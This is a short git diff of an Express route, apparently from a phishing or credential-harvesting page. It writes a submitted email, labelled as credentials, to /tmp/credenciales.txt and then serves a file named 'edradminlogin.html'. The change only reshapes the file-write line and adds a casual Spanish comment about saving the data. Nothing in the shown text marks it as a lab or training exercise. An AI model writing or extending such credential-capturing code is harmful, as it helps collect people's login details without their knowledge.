@@ -20,9 +20,9 @@ app.get("/auth", (req, res) => {
 
   // Guardar credenciales en archivo
   const credenciales = `Email: ${email} | Mail \n`;
-
-  const tempPath = path.join("/tmp", "credenciales.txt");
-  fs.appendFileSync(tempPath, credenciales);
+  
+// Aquí podrías guardarlo si quieres
+  fs.appendFileSync(path.join("/tmp", "credenciales.txt"), credenciales);
 
   const filePath = path.join(__dirname, "edradminlogin.html");
   res.sendFile(filePath);
